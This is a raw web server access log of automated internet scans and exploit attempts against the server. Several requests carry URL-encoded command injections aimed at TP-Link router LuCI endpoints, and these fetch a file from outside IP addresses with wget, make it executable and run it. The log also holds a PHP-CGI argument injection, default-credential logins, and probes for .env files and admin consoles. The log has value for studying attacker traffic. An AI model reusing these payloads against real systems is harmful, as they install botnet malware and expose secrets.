INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     83.222.191.62:0 - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0" 405 Method Not Allowed
INFO:     83.222.191.62:0 - "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0" 405 Method Not Allowed
INFO:     64.62.156.73:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.156.72:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.156.76:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.156.79:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     117.253.13.76:0 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     199.45.154.128:0 - "GET / HTTP/1.0" 200 OK
INFO:     199.45.154.128:0 - "GET / HTTP/1.0" 200 OK
INFO:     199.45.154.128:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     91.92.241.222:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     93.174.93.12:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     36.94.29.82:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     44.220.185.110:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     176.123.2.219:0 - "GET / HTTP/1.0" 200 OK
INFO:     176.123.2.219:0 - "POST /HNAP1/ HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     80.82.77.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     72.167.44.205:0 - "GET /manager/html HTTP/1.0" 200 OK
INFO:     117.253.151.227:0 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     172.169.190.75:0 - "GET / HTTP/1.0" 200 OK
INFO:     139.162.205.154:0 - "GET / HTTP/1.0" 200 OK
INFO:     194.55.186.238:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     117.235.0.42:0 - "GET / HTTP/1.0" 200 OK
INFO:     87.236.176.70:0 - "GET / HTTP/1.0" 200 OK
INFO:     34.77.126.178:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
